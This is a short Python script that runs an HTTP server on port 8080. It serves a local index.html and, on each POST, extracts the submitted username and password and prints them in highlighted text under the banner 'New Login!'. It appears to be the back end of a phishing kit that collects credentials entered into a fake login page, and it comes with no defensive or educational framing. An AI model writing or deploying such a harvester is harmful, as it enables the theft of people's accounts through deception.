from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime

class H(BaseHTTPRequestHandler):
    def log_message(self,f,*a): pass
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type","text/html")
        self.end_headers()
        self.wfile.write(open("index.html","rb").read())
    def do_POST(self):
        d=parse_qs(self.rfile.read(int(self.headers["Content-Length"])).decode())
        u=d.get("username",[""])[0]
        p=d.get("password",[""])[0]
        t=datetime.now().strftime("%H:%M:%S")
        print("\n\033[1m"+"="*35+"\033[0m")
        print(f"\033[92m  New Login! [{t}]\033[0m")
        print(f"\033[93m  Username : {u}\033[0m")
        print(f"\033[91m  Password : {p}\033[0m")
        print("\033[1m"+"="*35+"\033[0m")
        self.send_response(200)
        self.send_header("Content-type","text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

print("\033[96m\033[1m Waiting for logins on port 8080...\033[0m\n")
HTTPServer(("0.0.0.0",8080),H).serve_forever()
